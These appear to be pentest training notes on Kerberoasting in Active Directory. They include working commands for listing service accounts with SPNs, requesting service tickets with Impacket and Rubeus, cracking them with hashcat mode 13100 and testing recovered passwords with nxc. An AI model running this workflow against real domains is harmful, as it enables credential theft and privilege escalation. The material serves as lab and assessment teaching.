## Separate account discovery, ticket requests, and offline recovery

Kerberoasting starts with service principals associated with accounts. A ticket artifact is encrypted material suitable for an offline password-recovery attempt under the appropriate conditions; it is not an immediately usable password. Keep the account name, SPN, encryption type and source domain with the artifact.

### Find service accounts before requesting tickets

```powershell
Get-ADUser -Filter {ServicePrincipalName -like '*'} -Properties ServicePrincipalName,Description,PasswordLastSet
setspn -T DOMAIN_FQDN -Q */*
```

```bash
impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP
```

Use a valid lab domain identity. The Impacket form prompts for a password. Computer accounts can also have SPNs; their presence alone does not make them useful password-recovery candidates. Inspect the account purpose and relevant privileges.

### Request and save the relevant ticket material

```bash
impacket-GetUserSPNs 'DOMAIN_FQDN/USERNAME' -dc-ip DC_IP \
  -request -outputfile kerberoast.txt
```

```powershell
.\Rubeus.exe kerberoast /outfile:kerberoast.txt
```

Use the collector appropriate to the host and access you have. Confirm that the output actually contains ticket artifacts, not only banners/errors. Limit requests to the exercise scope; broad collection is not necessary when a specific account is the hypothesis.

### Identify the encryption format before selecting a mode

```bash
head -n 2 kerberoast.txt
hashcat --example-hashes
# RC4 Kerberos TGS artifact beginning with $krb5tgs$23$:
hashcat -m 13100 kerberoast.txt WORDLIST
hashcat -m 13100 kerberoast.txt --show
```

The example mode is for that artifact type. AES ticket formats use different modes. An exhausted wordlist means those candidates did not recover a value under that configuration; it does not mean the account does not exist or the ticket is automatically unusable.

### Validate a recovered credential in its scope

```bash
nxc smb TARGET_IP -d DOMAIN_FQDN -u SERVICE_ACCOUNT -p 'RECOVERED_PASSWORD'
```

Use one relevant host/protocol first. Then inspect the service account's groups, readable shares and object rights. Recovered credentials are not equivalent to administrator rights. If authentication fails, check domain selection, account status, password changes, logon restrictions and whether the recovered value belongs to the account you selected.

Common false starts are wrong DNS/DC selection, clock disagreement, incorrectly copied artifact lines, mismatched cracking modes, and treating all SPN-bearing accounts as equally useful. Record the precise failure so the next attempt tests a different hypothesis.

## Kerberoasting - from Linux

### **Section Summary: Kerberoasting - from Linux**

#### **Key Concepts**

- **Kerberoasting:** An attack technique used for lateral movement and privilege escalation in Active Directory. It targets service accounts that have a **Service Principal Name (SPN)** configured.
- **Service Principal Name (SPN):** A unique identifier that links a service instance (like a SQL server) to a domain user account that runs it. This is often done because regular service accounts have network authentication limitations.
- **Attack Logic:** Any authenticated domain user can request a Kerberos service ticket (TGS-REP) for any service in the domain. This ticket is encrypted with the NTLM hash of the service account's password. An attacker can take this ticket offline and attempt to crack it to recover the cleartext password.

#### **Practical Application**

The attack is performed from a Linux host using Impacket's `GetUserSPNs.py` script. The main prerequisite is a set of valid domain credentials (username/password or NTLM hash).

**1. List SPNs:**  
First, you can enumerate all user accounts with an SPN to identify potential targets.

- **Command:**
    
```shell
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```
    
- **Explanation:** This command queries the Domain Controller (`-dc-ip`) using the provided credentials (`<DOMAIN>/<USER>`) and lists all accounts with associated SPNs, along with their group memberships.

**2. Request TGS Tickets:**  
Once you identify interesting accounts (e.g., members of "Domain Admins"), you can request their TGS tickets.

- **Command:**
    
```shell
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request -outputfile tickets.txt
```
    
- **Explanation:** The `-request` flag tells the script to request the TGS tickets for all found SPNs. The `-outputfile` flag saves the tickets into a file (`tickets.txt`) in a format that password cracking tools can use.

**3. Crack the Ticket Offline:**  
With the ticket hash saved, you can use a tool like Hashcat to crack the password.

- **Command:**
    
```shell
hashcat -m 13100 tickets.txt /path/to/wordlist.txt
```
    
- **Explanation:** This command uses Hashcat with mode `-m 13100` (Kerberos 5, TGS-REP) to try and crack the password hashes in `tickets.txt` using a wordlist.

#### **Watch Out For**

- **Success is Not Guaranteed:** Cracking a TGS ticket can be time-consuming and may fail if the service account has a strong password. The value of a cracked password depends entirely on the privileges of that service account.
- **Reporting:** Even if you can't crack a ticket, the existence of SPNs with weak password policies is a valid security finding. The risk level (High vs. Medium) depends on whether you successfully compromised an account.
